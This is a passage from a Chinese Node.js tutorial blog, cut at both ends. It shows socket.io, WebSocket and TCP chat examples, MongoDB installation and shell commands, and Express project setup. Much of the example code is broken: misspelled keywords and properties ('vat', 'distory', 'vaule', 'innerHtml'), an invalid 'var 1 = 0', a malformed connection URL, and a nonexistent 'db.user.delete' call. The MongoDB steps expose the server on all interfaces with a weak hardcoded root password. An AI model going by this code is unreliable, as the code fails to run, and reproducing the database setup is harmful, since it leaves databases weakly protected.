class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'connection closed'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">'readline'</span>)</span><br><span class="line"><span class="keyword">const</span> r1 = readline.createInterface(&#123;</span><br><span class="line">  input: process.stdin,   <span class="comment">//标准输入</span></span><br><span class="line">  output: process.stdout</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  r1.question(<span class="string">'请输入：'</span>, (<span class="function"><span class="params">inputStr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (inputStr != <span class="string">'bye'</span>)&#123;</span><br><span class="line">      client.write(inputStr + <span class="string">'\n'</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      client.distory() <span class="comment">//关闭连接</span></span><br><span class="line">      r1.close()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-浏览器原生支持的WebSocket"><a href="#2-浏览器原生支持的WebSocket" class="headerlink" title="2). 浏览器原生支持的WebSocket"></a>2). 浏览器原生支持的<code>WebSocket</code></h4><p><code>npm install ws</code></p><p>案例同上</p><p>server.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wbsocketServer = <span class="built_in">require</span>(<span class="string">'ws'</span>).Server,</span><br><span class="line">    wss = <span class="keyword">new</span> wbsocketServer(&#123;<span class="attr">port</span>:<span class="number">9001</span>&#125;)</span><br><span class="line"><span class="keyword">var</span> clientMap = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">ws</span>)</span>&#123;</span><br><span class="line">  ws.name = ++i</span><br><span class="line">  clientMap[ws.name] = ws</span><br><span class="line">  <span class="built_in">console</span>.log(ws.name + <span class="string">" 上线了"</span>);</span><br><span class="line"></span><br><span class="line">  ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">message</span>)</span>&#123;</span><br><span class="line">    broadcast(message, ws)</span><br><span class="line">  &#125;)</span><br><span class="line">  ws.on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">message</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// global.gc()  //调用内存回收</span></span><br><span class="line">    <span class="built_in">console</span>.log(ws + <span class="string">" 离开"</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//广播方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">broadcast</span>(<span class="params">msg, ws</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> clientMap)&#123;</span><br><span class="line">    clientMap[key].send(ws.name + <span class="string">'说：'</span> + msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>)</span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://127.0.0.1:9001/'</span>)</span><br><span class="line"></span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  ws.send(<span class="string">'大家好'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> chatroom = <span class="built_in">document</span>.getElementById(<span class="string">'chatroom'</span>)</span><br><span class="line">  chatroom.innerHtml += <span class="string">'&lt;/br&gt;'</span> + event.data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onclose = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'Closed'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'Error:'</span> + err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chat.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chatroom"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"sayinput"</span> <span class="attr">id</span>=<span class="string">"sayinput"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">"send"</span> <span class="attr">id</span>=<span class="string">"sendbutton"</span> <span class="attr">value</span>=<span class="string">"发送"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"client.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">      ws.send(sayinput.value)</span></span><br><span class="line"><span class="actionscript">      sayinput.vaule = <span class="string">""</span></span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onkeyup = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (event.keycode == <span class="number">13</span>)&#123;</span></span><br><span class="line"><span class="undefined">          send()</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="actionscript">      sendbutton.onclick = <span class="function"><span class="keyword">function</span> <span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">        send()</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-socket-io实现socket"><a href="#3-socket-io实现socket" class="headerlink" title="3). socket.io实现socket"></a>3). <code>socket.io</code>实现socket</h4><p>当浏览器不支持html5时，就不能用websocket了</p><p>借助express实现: <code>npm i express socket.io</code></p><p>socket_io.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)()</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app)</span><br><span class="line">vat io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(http)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req,res)=&gt;&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    res.send(data.toString())</span><br><span class="line">  &#125;</span><br><span class="line">  fs.readFile(<span class="string">'socketIOClient.html'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"文件不存在"</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        callback(data)</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.get('/socket.io.js')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//socket.io的设置</span></span><br><span class="line"><span class="comment">//在线用户</span></span><br><span class="line"><span class="keyword">var</span> onlineUsers = &#123;&#125;</span><br><span class="line"><span class="comment">//在线人数</span></span><br><span class="line"><span class="keyword">var</span> onlineCount = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">io.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"有人上线了"</span>);</span><br><span class="line">  <span class="comment">//监听新用户加入</span></span><br><span class="line">  socket.name = i</span><br><span class="line">  onlineUsers[socket.name] = socket</span><br><span class="line"></span><br><span class="line">  <span class="comment">//监听用户退出</span></span><br><span class="line">  socket.on(<span class="string">'disconnect'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"有人退出了"</span>);</span><br><span class="line">    <span class="keyword">delete</span> onlineUsers[socket.name]</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//监听用户发布的聊天内容</span></span><br><span class="line">  socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">msg</span>)</span>&#123;</span><br><span class="line">      broadcast(msg, socket)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//广播方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">broadcast</span>(<span class="params">msg, socket</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> onlineUsers)&#123;</span><br><span class="line">    onlineUsers[key].send(socket.name + <span class="string">'说：'</span> + msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.listen(<span class="number">9002</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">""</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>html</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    #chatroom&#123;</span><br><span class="line">      width:<span class="number">400</span>px;</span><br><span class="line">      height:<span class="number">600</span>px;</span><br><span class="line">      overflow:auto;</span><br><span class="line">      border:<span class="number">1</span>px solid bule</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script src="./</span>socket.io.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;script type="</span>text/javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        var iosocket = null;</span></span><br><span class="line"><span class="string">        windows.onload = function ()&#123;</span></span><br><span class="line"><span class="string">          iosocket = io.connect('http://127.0.0.1/9002')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          iosocket.on('connect'. function ()&#123;</span></span><br><span class="line"><span class="string">            iosocket.send('hello, from inclient')</span></span><br><span class="line"><span class="string">          &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          //接收数据</span></span><br><span class="line"><span class="string">          iosocket.on('message', function (message)&#123;</span></span><br><span class="line"><span class="string">            var chatroom = document.getElementById("</span>chatroom<span class="string">");</span></span><br><span class="line"><span class="string">            chatroom.innerHtml += message = '&lt;/br&gt;'</span></span><br><span class="line"><span class="string">          &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          //断开连接</span></span><br><span class="line"><span class="string">          iosocket.on('disconnect', function ()&#123;</span></span><br><span class="line"><span class="string">            console.log("</span>服务端关闭<span class="string">");</span></span><br><span class="line"><span class="string">          &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          function send()&#123;</span></span><br><span class="line"><span class="string">            iosocket.send(sayinput.value)</span></span><br><span class="line"><span class="string">            sayinput.value = "</span><span class="string">''</span><span class="string">"</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          document.onkeyup = function(event)&#123;</span></span><br><span class="line"><span class="string">            if (event.keycode == 13)&#123;</span></span><br><span class="line"><span class="string">              send()</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          sendbutton.onclick = function ()&#123;</span></span><br><span class="line"><span class="string">            send()</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;div id="</span>chatroom<span class="string">"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;input type="</span>text<span class="string">" name="</span>sayinput<span class="string">" id="</span>sayinput<span class="string">" value="</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;input type="</span>button<span class="string">" name="</span>send<span class="string">" id="</span>sendbutton<span class="string">" value="</span>发送<span class="string">"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h2 id="七-MongoDB"><a href="#七-MongoDB" class="headerlink" title="七.MongoDB"></a>七.MongoDB</h2><h4 id="安装-Linux下"><a href="#安装-Linux下" class="headerlink" title="安装(Linux下)"></a>安装(Linux下)</h4><p><strong>1. 通过公钥对资源包一致性和真实性进行验证：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4</span><br></pre></td></tr></table></figure><p><strong>2. 运行下行命令，创建文件/etc/apt/sources.list.d/mongodb-org-4.0.list：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse"</span> | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list</span><br></pre></td></tr></table></figure><p><strong>3. 在安装之前，先更新系统资源包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p><strong>4. 安装mongodb资源包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装MongoDB server</span></span><br><span class="line">sudo apt-get install -y mongodb-org </span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装MongoDB 客户端</span></span><br><span class="line">sudo apt-get install mongodb-clients</span><br></pre></td></tr></table></figure><p><strong>4. 检验是否安装成功：</strong></p><p>启动mongod服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo service mongod start </span><br><span class="line"></span><br><span class="line"><span class="comment">#查看mongo版本:</span></span><br><span class="line">mongo --version</span><br></pre></td></tr></table></figure><p><strong>5.登录MongoDB并设置密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录</span></span><br><span class="line">mongo</span><br><span class="line"><span class="comment"># 切换到admin数据库</span></span><br><span class="line">use admin</span><br><span class="line"><span class="comment"># 创建admin账号，密码::admin111 权限：root权限，授权的数据库名：admin</span></span><br><span class="line">db.createUser(&#123;user:<span class="string">"admin"</span>, <span class="built_in">pwd</span>:<span class="string">"admin111"</span>, roles:[&#123;role:<span class="string">"root"</span>, db:<span class="string">"admin"</span>&#125;]&#125;)</span><br></pre></td></tr></table></figure><p>编辑MongoDB配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mongod.conf</span><br><span class="line"></span><br><span class="line">net:</span><br><span class="line">  port: 27017  <span class="comment"># 端口</span></span><br><span class="line">  bindIp: 0.0.0.0  <span class="comment"># 允许访问的地址，0.0.0.0表示所有</span></span><br><span class="line"></span><br><span class="line">security:</span><br><span class="line">  authorization: enabled</span><br></pre></td></tr></table></figure><p>重启MongoDB服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart mongod.service</span><br></pre></td></tr></table></figure><p>测试登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo -u admin -p admin111 --authenticationDatabase admin</span><br></pre></td></tr></table></figure><h5 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h5><blockquote><p>与mysql语法对比：<a href="https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg</a></p></blockquote><h6 id="术语、概念"><a href="#术语、概念" class="headerlink" title="术语、概念"></a>术语、概念</h6><p><img src="/Node-js-入门/mysql.png" alt></p><p><img src="/Node-js-入门/mysql2.png" alt></p><p><strong>MongoDB集合</strong></p><p>一个数据库可以有多个集合(对应mysql的table)</p><p><strong>MongoDB文档</strong></p><p>键值对</p><p>如：<code>{&#39;name&#39;:&#39;xps&#39;, &#39;like&#39;:[&#39;code&#39;,&#39;play&#39;]}</code></p><p><strong>MongoDB数据类型</strong></p><p><img src="/Node-js-入门/type.png" alt></p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h6 id="1-数据库操作"><a href="#1-数据库操作" class="headerlink" title="1.数据库操作"></a>1.数据库操作</h6><p>查看帮助</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span></span><br><span class="line">db.help()</span><br><span class="line">db.test.help()</span><br><span class="line">df.test.find().<span class="built_in">help</span>()</span><br></pre></td></tr></table></figure><p>创建/切换数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use music  <span class="comment"># 如果不存在就创建，存在且切换</span></span><br></pre></td></tr></table></figure><p>查询数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show dbs   <span class="comment"># 当数据库为空时，是不显示的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们向一个集合里面插入一个文档</span></span><br><span class="line">db.user.insertOne(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>,<span class="string">'like'</span>:[<span class="string">'code'</span>,<span class="string">'play'</span>]&#125;)</span><br><span class="line"><span class="comment"># 查看集合里面的文档(行)</span></span><br><span class="line">db.user.find()</span><br></pre></td></tr></table></figure><p>查看当前使用的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">db.getName()</span><br></pre></td></tr></table></figure><p>显示当前DB状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.stats()</span><br></pre></td></tr></table></figure><p>查看当前DB版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.version()</span><br></pre></td></tr></table></figure><p>查看当前DB的链接机器地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.getMongo()</span><br></pre></td></tr></table></figure><p>删除数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure><h6 id="2-集合（Collection）操作"><a href="#2-集合（Collection）操作" class="headerlink" title="2.集合（Collection）操作"></a>2.集合（Collection）操作</h6><p>….写了半天，忘了保存，算了，放图片吧….</p><p><img src="/Node-js-入门/collec.png"></p><h6 id="3-文档操作"><a href="#3-文档操作" class="headerlink" title="3.文档操作"></a>3.文档操作</h6><p>对集合内数据增删改查</p><p><img src="/Node-js-入门/q0.png"></p><p>删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.user.remove(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>&#125;)</span><br><span class="line">db.user.delete(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>&#125;)</span><br><span class="line">db.user.deleteMany(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="/Node-js-入门/q1.png"></p><p><img src="/Node-js-入门/q2.png"></p><p><img src="/Node-js-入门/q3.png"></p><h2 id="八-Express框架"><a href="#八-Express框架" class="headerlink" title="八. Express框架"></a>八. Express框架</h2><blockquote><p>一个node.js的web框架</p></blockquote><h4 id="1-准备"><a href="#1-准备" class="headerlink" title="1). 准备"></a>1). 准备</h4><p><strong>安装</strong></p><p><code>npm install express --save</code>, Windows下还有:<code>npm install -g express-generator</code></p><p><code>express -h</code> 测试安装成功</p><p>新建项目：<code>express test_express</code> </p><p><strong>目录结构：</strong></p><p>package.js是需要的依赖，切换到项目根目录手动安装<code>npm install</code></p><p>app.js是入口</p><p>www/bin下面是端口等配置</p><p><strong>启动项目：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><h4 id="2-Express初始化项目详解"><a href="#2-Express初始化项目详解" class="headerlink" title="2). Express初始化项目详解"></a>2). Express初始化项目详解</h4><p>一些模块</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">"dependencies": &#123;</span><br><span class="line">  //"body-parser": "~1.15.2",   // 解析前端提交的数据</span><br><span class="line">  "cookie-parser": "~1.4.4",   //解析cookie</span><br><span class="line">  "debug": "~2.6.9",    // 用来显示调试信息</span><br><span class="line">  //"ejs": "~2.5.2",   //模板，渲染页面   </span><br><span class="line">  "express": "~4.16.1",  </span><br><span class="line">  "http-errors": "~1.6.3", </span><br><span class="line">  "jade": "~1.11.0",   //模板，渲染页面</span><br><span class="line">  "morgan": "~1.9.1"   //日志，控制后格式化显示信息</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>bin/www</code>入口文件</p><p>实现了创建服务和中间件、路由配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">normalizePort() 方法，对端口进行简单处理</span><br><span class="line"></span><br><span class="line"></span><br><span 